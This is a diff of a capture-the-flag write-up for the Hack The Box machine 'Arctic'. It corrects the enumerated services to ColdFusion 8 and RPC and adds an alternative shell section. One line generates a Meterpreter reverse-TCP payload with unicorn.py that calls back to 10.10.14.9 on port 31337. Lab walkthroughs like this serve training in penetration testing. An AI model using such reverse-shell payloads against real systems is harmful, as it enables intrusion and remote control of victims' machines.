@@ -2,14 +2,14 @@
 ![logo](/logo.png)
 
 # [Arctic- BOX]  
-Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 22 Mar 2017 as the sixth machine on HTB,Arctic created by ch4p.So without any further intro, let'sf jump in.
+Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 22 Mar 2017 as the ninth machine on HTB,Arctic created by ch4p.So without any further intro, let'sf jump in.
 
 # common enumeration
 
 ## Nmap
-  *http
-  *HFS
-  *HttpFileserver
+  *msrpc
+  *ColdFusion 8
+  *Windows Rpc
   
 ###### code-nmap
 
@@ -252,6 +252,7 @@ set LPORT 1347
 
 and you get the privillage shell witn `NT/Authority`
 
+### Another way to get Shell
 
 ```sh
 python unicorn.py windows/meterpreter/reverse_tcp 10.10.14.9 31337  
